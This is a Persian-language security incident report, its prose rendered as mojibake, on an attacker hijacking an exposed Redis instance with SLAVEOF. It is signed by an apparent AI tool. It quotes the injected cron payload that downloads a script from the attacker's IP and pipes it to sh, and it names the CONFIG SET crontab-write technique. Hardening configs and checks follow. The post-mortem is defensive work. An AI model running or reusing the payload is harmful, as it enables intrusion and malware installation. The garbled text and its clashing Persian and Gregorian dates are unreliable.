# ğŸ”´ Ú¯Ø²Ø§Ø±Ø´ Ø­Ø§Ø¯Ø«Ù‡ Ø§Ù…Ù†ÛŒØªÛŒ â€” Ø­Ù…Ù„Ù‡ Ø¨Ù‡ Redis

**ØªØ§Ø±ÛŒØ® Ø­Ø§Ø¯Ø«Ù‡**: 17 Ø¨Ù‡Ù…Ù† 1404 (17 February 2026) â€” Ø³Ø§Ø¹Øª 01:51 UTC  
**ØªØ§Ø±ÛŒØ® Ø´Ù†Ø§Ø³Ø§ÛŒÛŒ**: 17 Ø¨Ù‡Ù…Ù† 1404 â€” Ø³Ø§Ø¹Øª 04:17 UTC  
**Ø´Ø¯Øª**: Ø¨Ø§Ù„Ø§ (High)  
**ÙˆØ¶Ø¹ÛŒØª**: Ø±ÙØ¹ Ø´Ø¯Ù‡ âœ…  

---

## ğŸ“Œ Ø®Ù„Ø§ØµÙ‡

Ù…Ù‡Ø§Ø¬Ù… Ø§Ø² Ø·Ø±ÛŒÙ‚ Ù¾ÙˆØ±Øª Ø¨Ø§Ø² Redis (6380) Ú©Ù‡ Ø¨Ø¯ÙˆÙ† Ø±Ù…Ø² Ø¹Ø¨ÙˆØ± Ùˆ Ø¨Ø¯ÙˆÙ† Ù…Ø­Ø¯ÙˆØ¯ÛŒØª IP Ø¨Ù‡ Ø§ÛŒÙ†ØªØ±Ù†Øª expose Ø´Ø¯Ù‡ Ø¨ÙˆØ¯ØŒ Ø¨Ù‡ Redis Ù…ØªØµÙ„ Ø´Ø¯Ù‡ Ùˆ Ø¯Ø³ØªÙˆØ± `SLAVEOF` Ø§Ø±Ø³Ø§Ù„ Ú©Ø±Ø¯Ù‡ Ø§Ø³Øª. Ø§ÛŒÙ† Ø¨Ø§Ø¹Ø« Ø´Ø¯ Redis Ø¨Ù‡ Ø­Ø§Ù„Øª read-only replica ØªØ¨Ø¯ÛŒÙ„ Ø´ÙˆØ¯ Ùˆ ÛŒÚ© Ú©Ù„ÛŒØ¯ Ù…Ø®Ø±Ø¨ Ø­Ø§ÙˆÛŒ cron job Ø¨Ø¯Ø§ÙØ²Ø§Ø±ÛŒ ØªØ²Ø±ÛŒÙ‚ Ø´ÙˆØ¯.

---

## ğŸ• Ø¬Ø¯ÙˆÙ„ Ø²Ù…Ø§Ù†ÛŒ (Timeline)

| Ø²Ù…Ø§Ù† (UTC) | Ø±ÙˆÛŒØ¯Ø§Ø¯ |
|---|---|
| 16 Feb ~09:22 | Ø¢Ø®Ø±ÛŒÙ† restart Ø¹Ø§Ø¯ÛŒ Ø³Ø±ÙˆØ± â€” Redis Ø¨Ù‡ ØµÙˆØ±Øª master Ø¨Ø§Ù„Ø§ Ø¢Ù…Ø¯ |
| **17 Feb 01:51:45** | **Ù…Ù‡Ø§Ø¬Ù… Ø¯Ø³ØªÙˆØ± `SLAVEOF 160.30.159.104 6379` Ø±Ø§ Ø¨Ù‡ Redis Ø§Ø±Ø³Ø§Ù„ Ú©Ø±Ø¯** |
| 17 Feb 01:51:45+ | Redis Ø¨Ù‡ Ø­Ø§Ù„Øª slave/replica ØªØ¨Ø¯ÛŒÙ„ Ø´Ø¯ â€” ØªÙ„Ø§Ø´â€ŒÙ‡Ø§ÛŒ Ù…Ú©Ø±Ø± Ø¨Ø±Ø§ÛŒ sync Ø¨Ø§ master Ù…Ù‡Ø§Ø¬Ù… (Ù‡Ù…Ù‡ Ù†Ø§Ù…ÙˆÙÙ‚) |
| 17 Feb ~01:51 | Ú©Ù„ÛŒØ¯ Ù…Ø®Ø±Ø¨ `x` Ø­Ø§ÙˆÛŒ cron job Ø¨Ø¯Ø§ÙØ²Ø§Ø±ÛŒ Ø¯Ø± Redis ØªØ²Ø±ÛŒÙ‚ Ø´Ø¯ |
| 17 Feb ~04:17 | Celery worker Ø¨Ø§ Ø®Ø·Ø§ÛŒ `ReadOnlyError` Ú©Ø±Ø´ Ú©Ø±Ø¯ |
| **17 Feb 04:17** | **Ø­Ø§Ø¯Ø«Ù‡ Ø´Ù†Ø§Ø³Ø§ÛŒÛŒ Ø´Ø¯** â€” Ø¨Ø±Ø±Ø³ÛŒ ÙˆØ¶Ø¹ÛŒØª Ú©Ø§Ù†ØªÛŒÙ†Ø±Ù‡Ø§ |
| 17 Feb 04:18 | Redis Ø±ÛŒØ³ØªØ§Ø±Øª Ø´Ø¯ â€” Ø¨Ù‡ Ø­Ø§Ù„Øª master Ø¨Ø±Ú¯Ø´Øª |
| 17 Feb 04:20 | Ø¹Ù„Øª Ø§ØµÙ„ÛŒ Ø´Ù†Ø§Ø³Ø§ÛŒÛŒ Ø´Ø¯ â€” Ù„Ø§Ú¯ Redis Ø¨Ø±Ø±Ø³ÛŒ Ø´Ø¯ |
| 17 Feb 04:25 | Ú©Ù„ÛŒØ¯ Ù…Ø®Ø±Ø¨ `x` Ø´Ù†Ø§Ø³Ø§ÛŒÛŒ Ùˆ Ø­Ø°Ù Ø´Ø¯ |
| 17 Feb 04:30 | Ø§Ù‚Ø¯Ø§Ù…Ø§Øª Ø§Ù…Ù†ÛŒØªÛŒ Ø§Ø¹Ù…Ø§Ù„ Ø´Ø¯ (bind to localhost, DOCKER-USER chain, ufw) |
| 17 Feb 04:47 | Ù‡Ù…Ù‡ Ø³Ø±ÙˆÛŒØ³â€ŒÙ‡Ø§ Ø³Ø§Ù„Ù… Ùˆ Ø§Ù…Ù† ØªØ£ÛŒÛŒØ¯ Ø´Ø¯Ù†Ø¯ |

---

## ğŸ” Ø¬Ø²Ø¦ÛŒØ§Øª ÙÙ†ÛŒ Ø­Ù…Ù„Ù‡

### Û±. Ù†Ù‚Ø·Ù‡ ÙˆØ±ÙˆØ¯ (Entry Point)

Redis Ø±ÙˆÛŒ Ù¾ÙˆØ±Øª `6380` Ø¨Ø¯ÙˆÙ† Ù‡ÛŒÚ† Ù…Ø­Ø§ÙØ¸ØªÛŒ Ø¨Ù‡ Ø§ÛŒÙ†ØªØ±Ù†Øª expose Ø´Ø¯Ù‡ Ø¨ÙˆØ¯:

```yaml
# docker-compose.ingest.yml (Ù‚Ø¨Ù„ Ø§Ø² Ø§ØµÙ„Ø§Ø­)
redis:
  ports:
    - "6380:6379"  # âš ï¸ Ø¨Ø¯ÙˆÙ† Ù…Ø­Ø¯ÙˆØ¯ÛŒØª IP â€” Ø§Ø² Ø§ÛŒÙ†ØªØ±Ù†Øª Ù‚Ø§Ø¨Ù„ Ø¯Ø³ØªØ±Ø³ÛŒ
  command: redis-server --maxmemory 256mb --maxmemory-policy allkeys-lru --save ""
  # âš ï¸ Ø¨Ø¯ÙˆÙ† Ø±Ù…Ø² Ø¹Ø¨ÙˆØ± (requirepass)
  # âš ï¸ Ø¨Ø¯ÙˆÙ† protected-mode
```

### Û². Ø¯Ø³ØªÙˆØ± Ù…Ù‡Ø§Ø¬Ù…

Ù…Ù‡Ø§Ø¬Ù… Ø§Ø² IP `160.30.159.104` Ø¨Ù‡ Redis Ù…ØªØµÙ„ Ø´Ø¯Ù‡ Ùˆ Ø¯Ø³ØªÙˆØ± Ø²ÛŒØ± Ø±Ø§ Ø§Ø¬Ø±Ø§ Ú©Ø±Ø¯Ù‡:

```
SLAVEOF 160.30.159.104 6379
```

Ù„Ø§Ú¯ Redis:
```
1:S 17 Feb 2026 01:51:45.509 * REPLICAOF 160.30.159.104:6379 enabled 
  (user request from 'id=9502 addr= laddr=172.18.0.4:6379 fd=27 
   name= age=1 idle=0 flags=N db=0 sub=0 psub=0 ssub=0 multi=-1 
   watch=0 qbuf=693 qbuf-free=19781 argv-mem=25 multi-mem=0 
   rbs=16384 rbp=16384 obl=591 oll=0 omem=0 tot-mem=37809 
   events=r cmd=slaveof user=default redir=-1 resp=2 
   lib-name= lib-ver=')
```

### Û³. Ø¨Ø¯Ø§ÙØ²Ø§Ø± ØªØ²Ø±ÛŒÙ‚ Ø´Ø¯Ù‡ (Malicious Payload)

Ú©Ù„ÛŒØ¯ `x` Ø¯Ø± Redis Ø¨Ø§ Ù…Ø­ØªÙˆØ§ÛŒ Ø²ÛŒØ± ØªØ²Ø±ÛŒÙ‚ Ø´Ø¯:

```
*/5 * * * * (curl -sL http://160.30.159.104/j.sh | sh || wget -qO- http://160.30.159.104/j.sh | sh || cd /tmp; wget http://160.30.159.104/j.sh -O jack5tr.sh; sh jack5tr.sh)
```

**ØªØ­Ù„ÛŒÙ„ Ø¨Ø¯Ø§ÙØ²Ø§Ø±:**

- **Ù†ÙˆØ¹**: Cron job Ù…Ø®Ø±Ø¨ â€” Ù‡Ø± Ûµ Ø¯Ù‚ÛŒÙ‚Ù‡ Ø§Ø¬Ø±Ø§ Ù…ÛŒâ€ŒØ´ÙˆØ¯
- **Ø¹Ù…Ù„Ú©Ø±Ø¯**: Ø¯Ø§Ù†Ù„ÙˆØ¯ Ùˆ Ø§Ø¬Ø±Ø§ÛŒ Ø§Ø³Ú©Ø±ÛŒÙ¾Øª `j.sh` Ø§Ø² Ø³Ø±ÙˆØ± Ù…Ù‡Ø§Ø¬Ù… (`160.30.159.104`)
- **Ù†Ø§Ù… ÙØ§ÛŒÙ„**: `jack5tr.sh` â€” Ø§Ø­ØªÙ…Ø§Ù„Ø§Ù‹ Ù…Ø±Ø¨ÙˆØ· Ø¨Ù‡ Ø¨Ø¯Ø§ÙØ²Ø§Ø± **Jackpotting** ÛŒØ§ **Crypto Mining**
- **Ø±ÙˆØ´â€ŒÙ‡Ø§ÛŒ Ø¯Ø§Ù†Ù„ÙˆØ¯**: Ø³Ù‡ Ø±ÙˆØ´ fallback: `curl`ØŒ `wget -qO-`ØŒ `wget` Ø¨Ù‡ ÙØ§ÛŒÙ„
- **Ù‡Ø¯Ù Ù†Ù‡Ø§ÛŒÛŒ**: Ø§ÛŒÙ† ØªÚ©Ù†ÛŒÚ© Ù…Ø¹Ù…ÙˆÙ„Ø§Ù‹ Ø¨Ø±Ø§ÛŒ Ù†ØµØ¨ **cryptocurrency miner** (Ù…Ø«Ù„ XMRig) ÛŒØ§ **botnet agent** Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…ÛŒâ€ŒØ´ÙˆØ¯

**âš ï¸ Ù†Ú©ØªÙ‡ Ù…Ù‡Ù…**: Ø§ÛŒÙ† cron job ÙÙ‚Ø· Ø¯Ø§Ø®Ù„ Redis Ø°Ø®ÛŒØ±Ù‡ Ø´Ø¯Ù‡ Ø¨ÙˆØ¯. Ø¯Ø± Ø­Ù…Ù„Ø§Øª Ù…Ø¹Ù…ÙˆÙ„ RedisØŒ Ù…Ù‡Ø§Ø¬Ù… Ø³Ø¹ÛŒ Ù…ÛŒâ€ŒÚ©Ù†Ø¯ Ø¨Ø§ Ø¯Ø³ØªÙˆØ±Ø§Øª `CONFIG SET dir /etc/cron.d` Ùˆ `CONFIG SET dbfilename root` ÙØ§ÛŒÙ„ RDB Ø±Ø§ Ø¨Ù‡ Ù…Ø³ÛŒØ± crontab Ø³ÛŒØ³ØªÙ… Ø¨Ù†ÙˆÛŒØ³Ø¯. Ø§Ù…Ø§ Ú†ÙˆÙ† Redis Ø¯Ø§Ø®Ù„ Docker container Ø§Ø¬Ø±Ø§ Ù…ÛŒâ€ŒØ´Ø¯ØŒ Ø§ÛŒÙ† Ø­Ù…Ù„Ù‡ **Ø¨Ù‡ Ø³ÛŒØ³ØªÙ… Ø¹Ø§Ù…Ù„ host Ù†ÙÙˆØ° Ù†Ú©Ø±Ø¯Ù‡** Ø§Ø³Øª.

### Û´. ØªØ£Ø«ÛŒØ± Ø­Ù…Ù„Ù‡

| Ù…ÙˆØ±Ø¯ | ØªØ£Ø«ÛŒØ± |
|---|---|
| **Redis** | Ø¨Ù‡ Ø­Ø§Ù„Øª read-only ØªØ¨Ø¯ÛŒÙ„ Ø´Ø¯ â€” Ú©Ù„ÛŒØ¯ Ù…Ø®Ø±Ø¨ ØªØ²Ø±ÛŒÙ‚ Ø´Ø¯ |
| **Celery Worker** | Ú©Ø±Ø´ Ú©Ø±Ø¯ (`ReadOnlyError`) â€” ØªØ³Ú©â€ŒÙ‡Ø§ Ø§Ø¬Ø±Ø§ Ù†Ø´Ø¯Ù†Ø¯ |
| **ÙˆØ¨â€ŒØ³Ø§ÛŒØª** | Ø³Ø§Ù„Ù… Ù…Ø§Ù†Ø¯ â€” Django Ø§Ø² Redis ÙÙ‚Ø· Ø¨Ø±Ø§ÛŒ Celery Ùˆ session Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…ÛŒâ€ŒÚ©Ù†Ø¯ |
| **Ø¯ÛŒØªØ§Ø¨ÛŒØ³** | ØªØ£Ø«ÛŒØ± Ù†Ø¯Ø§Ø´Øª â€” PostgreSQL Ù…Ø³ØªÙ‚Ù„ Ø§Ø³Øª |
| **Ø³ÛŒØ³ØªÙ… Ø¹Ø§Ù…Ù„ Host** | ØªØ£Ø«ÛŒØ± Ù†Ø¯Ø§Ø´Øª â€” Ø­Ù…Ù„Ù‡ Ù…Ø­Ø¯ÙˆØ¯ Ø¨Ù‡ Docker container Ø¨ÙˆØ¯ |

---

## ğŸ” Ø¨Ø±Ø±Ø³ÛŒ Ù†ÙÙˆØ° (Compromise Assessment)

Ø¨Ø±Ø±Ø³ÛŒâ€ŒÙ‡Ø§ÛŒ Ø²ÛŒØ± Ø§Ù†Ø¬Ø§Ù… Ø´Ø¯ Ùˆ **Ù‡ÛŒÚ† Ù†Ø´Ø§Ù†Ù‡â€ŒØ§ÛŒ Ø§Ø² Ù†ÙÙˆØ° Ø¨Ù‡ Ø¨Ù‚ÛŒÙ‡ Ø³ÛŒØ³ØªÙ… ÛŒØ§ÙØª Ù†Ø´Ø¯**:

| Ø¨Ø±Ø±Ø³ÛŒ | Ù†ØªÛŒØ¬Ù‡ | Ø¯Ø³ØªÙˆØ± |
|---|---|---|
| Crontab Ø³ÛŒØ³ØªÙ… | âœ… ØªÙ…ÛŒØ² | `crontab -l; cat /etc/crontab; ls /etc/cron.d/` |
| SSH Authorized Keys | âœ… ÙÙ‚Ø· Ú©Ù„ÛŒØ¯ Ù…Ø¬Ø§Ø² | `cat ~/.ssh/authorized_keys` |
| Ù¾Ø±ÙˆØ³Ù‡â€ŒÙ‡Ø§ÛŒ Ù…Ø´Ú©ÙˆÚ© | âœ… Ù‡ÛŒÚ†â€ŒÚ©Ø¯Ø§Ù… | `ps aux \| grep -E "mine\|xmr\|kinsing"` |
| ÙØ§ÛŒÙ„â€ŒÙ‡Ø§ÛŒ Ù…Ø´Ú©ÙˆÚ© Ø¯Ø± /tmp | âœ… ØªÙ…ÛŒØ² | `find /tmp /var/tmp /dev/shm -type f` |
| Ú©Ø§Ù†ØªÛŒÙ†Ø±Ù‡Ø§ÛŒ Docker Ø§Ø¶Ø§ÙÛŒ | âœ… ÙÙ‚Ø· Ø®ÙˆØ¯Ù…Ø§Ù† | `docker ps -a` |
| Ù„Ø§Ú¯ SSH | âœ… ÙÙ‚Ø· IPÙ‡Ø§ÛŒ Ø´Ù†Ø§Ø®ØªÙ‡â€ŒØ´Ø¯Ù‡ | `grep "Accepted" /var/log/auth.log` |
| Ú©Ù„ÛŒØ¯Ù‡Ø§ÛŒ Redis | âœ… ÙÙ‚Ø· Celery/Django | `redis-cli KEYS '*'` |

---

## ğŸ›¡ï¸ Ø§Ù‚Ø¯Ø§Ù…Ø§Øª Ø§ØµÙ„Ø§Ø­ÛŒ Ø§Ù†Ø¬Ø§Ù… Ø´Ø¯Ù‡

### Û±. Ø¨Ø³ØªÙ† Ù¾ÙˆØ±Øªâ€ŒÙ‡Ø§ Ø¯Ø± Docker Compose

```yaml
# docker-compose.ingest.yml (Ø¨Ø¹Ø¯ Ø§Ø² Ø§ØµÙ„Ø§Ø­)
redis:
  ports:
    - "127.0.0.1:6380:6379"    # ÙÙ‚Ø· localhost
  command: >
    redis-server --maxmemory 256mb --maxmemory-policy allkeys-lru --save ""
    --protected-mode yes
    --rename-command SLAVEOF ""
    --rename-command REPLICAOF ""
    --rename-command DEBUG ""
    --rename-command CONFIG ""

db:
  ports:
    - "127.0.0.1:15432:5432"   # ÙÙ‚Ø· localhost

cadvisor:
  ports:
    - "127.0.0.1:8080:8080"    # ÙÙ‚Ø· localhost
```

### Û². Ø§ØµÙ„Ø§Ø­ UFW

**Ù‚Ø¨Ù„:**
```
22, 80, 443, 81, 8001, 9000, 9001 â†’ ALLOW from Anywhere
```

**Ø¨Ø¹Ø¯:**
```
22 (SSH)      â†’ ALLOW from Anywhere
80 (HTTP)     â†’ ALLOW from Anywhere
443 (HTTPS)   â†’ ALLOW from Anywhere
81 (NPM)      â†’ ALLOW from 192.168.100.0/24 only
8001 (Django)  â†’ ALLOW from 192.168.100.0/24 only
9000 (MinIO)   â†’ ALLOW from 192.168.100.0/24 only
9001 (MinIO)   â†’ ALLOW from 192.168.100.0/24 only
6380 (Redis)   â†’ ALLOW from 192.168.100.0/24 only
15432 (PgSQL)  â†’ ALLOW from 192.168.100.0/24 only
8080 (cAdvisor)â†’ ALLOW from 192.168.100.0/24 only
```

### Û³. DOCKER-USER iptables Chain

Docker Ø¨Ù‡ Ø·ÙˆØ± Ù¾ÛŒØ´â€ŒÙØ±Ø¶ UFW Ø±Ø§ Ø¯ÙˆØ± Ù…ÛŒâ€ŒØ²Ù†Ø¯. `DOCKER-USER` chain Ø¨Ù‡ `/etc/ufw/after.rules` Ø§Ø¶Ø§ÙÙ‡ Ø´Ø¯:

```
*filter
:DOCKER-USER - [0:0]
-A DOCKER-USER -m conntrack --ctstate ESTABLISHED,RELATED -j RETURN
-A DOCKER-USER -s 172.16.0.0/12 -j RETURN     # Docker internal
-A DOCKER-USER -s 192.168.100.0/24 -j RETURN   # LAN
-A DOCKER-USER -s 10.10.10.0/24 -j RETURN      # DMZ
-A DOCKER-USER -s 127.0.0.0/8 -j RETURN        # Localhost
-A DOCKER-USER -p tcp --dport 80 -j RETURN      # HTTP
-A DOCKER-USER -p tcp --dport 443 -j RETURN     # HTTPS
-A DOCKER-USER -j DROP                          # Drop everything else
COMMIT
```

### Û´. Systemd Service

`/etc/systemd/system/docker-user-iptables.service` Ø§ÛŒØ¬Ø§Ø¯ Ø´Ø¯ ØªØ§ Ø¨Ø¹Ø¯ Ø§Ø² Ù‡Ø± restart Ø³Ø±ÙˆØ± ÛŒØ§ DockerØŒ Ù‚ÙˆØ§Ù†ÛŒÙ† DOCKER-USER Ø®ÙˆØ¯Ú©Ø§Ø± Ø§Ø¹Ù…Ø§Ù„ Ø´ÙˆÙ†Ø¯.

### Ûµ. Ù¾Ø§Ú©Ø³Ø§Ø²ÛŒ Redis

- Ú©Ù„ÛŒØ¯ Ù…Ø®Ø±Ø¨ `x` Ø­Ø°Ù Ø´Ø¯
- `BGSAVE` Ø§Ø¬Ø±Ø§ Ø´Ø¯ ØªØ§ RDB Ø¬Ø¯ÛŒØ¯ Ø¨Ø¯ÙˆÙ† Ø¨Ø¯Ø§ÙØ²Ø§Ø± Ø°Ø®ÛŒØ±Ù‡ Ø´ÙˆØ¯

---

## ğŸ“ Ù…Ø¹Ù…Ø§Ø±ÛŒ Ø´Ø¨Ú©Ù‡ Ø³Ø±ÙˆØ±

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    INTERNET                          â”‚
â”‚                       â”‚                              â”‚
â”‚              ens19: 89.165.44.10                     â”‚
â”‚                       â”‚                              â”‚
â”‚              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
â”‚              â”‚   UFW + DOCKER  â”‚                     â”‚
â”‚              â”‚   USER chain    â”‚                     â”‚
â”‚              â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
â”‚                       â”‚                              â”‚
â”‚         Only ports 22, 80, 443                       â”‚
â”‚                       â”‚                              â”‚
â”‚              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
â”‚              â”‚  Nginx Proxy    â”‚ â†â”€â”€ 80/443          â”‚
â”‚              â”‚  Manager        â”‚                     â”‚
â”‚              â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
â”‚                       â”‚                              â”‚
â”‚              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
â”‚              â”‚  Django (web)   â”‚ â†â”€â”€ 127.0.0.1:8001  â”‚
â”‚              â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
â”‚                       â”‚                              â”‚
â”‚    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”           â”‚
â”‚    â”‚                  â”‚                  â”‚           â”‚
â”‚ â”Œâ”€â”€â”´â”€â”€â”€â”       â”Œâ”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”    â”‚
â”‚ â”‚Redis â”‚       â”‚ PostgreSQL  â”‚    â”‚   MinIO    â”‚    â”‚
â”‚ â”‚:6380 â”‚       â”‚   :15432    â”‚    â”‚ :9000/9001 â”‚    â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”˜       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â”‚ 127.0.0.1      127.0.0.1         127.0.0.1         â”‚
â”‚                                                     â”‚
â”‚  ens18: 192.168.100.101 (LAN)                       â”‚
â”‚  ens20: 10.10.10.10 (DMZ)                           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## ğŸ“‹ Ú†Ú©â€ŒÙ„ÛŒØ³Øª Ø§Ù…Ù†ÛŒØªÛŒ (Ø¨Ø±Ø§ÛŒ Ø¨Ø±Ø±Ø³ÛŒ Ø¯ÙˆØ±Ù‡â€ŒØ§ÛŒ)

- [ ] `ss -tlnp | grep -v 127.0.0.1` â€” ÙÙ‚Ø· Ù¾ÙˆØ±Øªâ€ŒÙ‡Ø§ÛŒ 22, 80, 443 Ø¨Ø§ÛŒØ¯ Ø§Ø² `0.0.0.0` listen Ú©Ù†Ù†Ø¯
- [ ] `sudo iptables -L DOCKER-USER -n` â€” Ù‚ÙˆØ§Ù†ÛŒÙ† DROP Ø¨Ø§ÛŒØ¯ ÙØ¹Ø§Ù„ Ø¨Ø§Ø´Ù†Ø¯
- [ ] `sudo ufw status` â€” ÙÙ‚Ø· 22/80/443 Ø§Ø² AnywhereØŒ Ø¨Ù‚ÛŒÙ‡ Ø§Ø² LAN
- [ ] `docker exec deployment-redis-1 redis-cli INFO replication` â€” Ø¨Ø§ÛŒØ¯ `role:master` Ø¨Ø§Ø´Ø¯
- [ ] `docker exec deployment-redis-1 redis-cli KEYS '*' | grep -v celery | grep -v _kombu | grep -v django` â€” Ù†Ø¨Ø§ÛŒØ¯ Ú©Ù„ÛŒØ¯ Ù…Ø´Ú©ÙˆÚ©ÛŒ ÙˆØ¬ÙˆØ¯ Ø¯Ø§Ø´ØªÙ‡ Ø¨Ø§Ø´Ø¯
- [ ] `systemctl status docker-user-iptables.service` â€” Ø¨Ø§ÛŒØ¯ active Ø¨Ø§Ø´Ø¯

---

## ğŸ”— Ù…Ù†Ø§Ø¨Ø¹ Ù…Ø±ØªØ¨Ø·

- [Redis Security - Official Docs](https://redis.io/docs/management/security/)
- [Docker and UFW - Known Issue](https://docs.docker.com/network/packet-filtering-firewalls/)
- [Redis SLAVEOF Attack Technique](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)

---

## ğŸ“ Ø¯Ø±Ø³â€ŒÙ‡Ø§ÛŒ Ø¢Ù…ÙˆØ®ØªÙ‡ Ø´Ø¯Ù‡

1. **Ù‡Ø±Ú¯Ø² Redis Ø±Ø§ Ø¨Ø¯ÙˆÙ† Ø±Ù…Ø² Ø¹Ø¨ÙˆØ± Ùˆ Ø¨Ø¯ÙˆÙ† bind Ø¨Ù‡ localhost Ø¨Ù‡ Ø§ÛŒÙ†ØªØ±Ù†Øª expose Ù†Ú©Ù†ÛŒØ¯**
2. **Docker Ø¨Ù‡ Ø·ÙˆØ± Ù¾ÛŒØ´â€ŒÙØ±Ø¶ UFW Ø±Ø§ Ø¯ÙˆØ± Ù…ÛŒâ€ŒØ²Ù†Ø¯** â€” Ø­ØªÙ…Ø§Ù‹ `DOCKER-USER` chain ØªÙ†Ø¸ÛŒÙ… Ø´ÙˆØ¯
3. **Ù¾ÙˆØ±Øªâ€ŒÙ‡Ø§ÛŒ Ø¯Ø§Ø®Ù„ÛŒ (Redis, PostgreSQL, MinIO) Ø¨Ø§ÛŒØ¯ ÙÙ‚Ø· Ø§Ø² `127.0.0.1` listen Ú©Ù†Ù†Ø¯**
4. **Ø¯Ø³ØªÙˆØ±Ø§Øª Ø®Ø·Ø±Ù†Ø§Ú© Redis (`SLAVEOF`, `CONFIG`, `DEBUG`) Ø¨Ø§ÛŒØ¯ ØºÛŒØ±ÙØ¹Ø§Ù„ Ø´ÙˆÙ†Ø¯**
5. **Ø¨Ø±Ø±Ø³ÛŒ Ø¯ÙˆØ±Ù‡â€ŒØ§ÛŒ Ù¾ÙˆØ±Øªâ€ŒÙ‡Ø§ÛŒ Ø¨Ø§Ø² Ø³Ø±ÙˆØ± Ø¶Ø±ÙˆØ±ÛŒ Ø§Ø³Øª**

---

**ØªÙ‡ÛŒÙ‡â€ŒÚ©Ù†Ù†Ø¯Ù‡**: Cascade AI  
**ØªØ§Ø±ÛŒØ® ØªÙ‡ÛŒÙ‡**: 28 Ø¨Ù‡Ù…Ù† 1404 (2026-02-17)
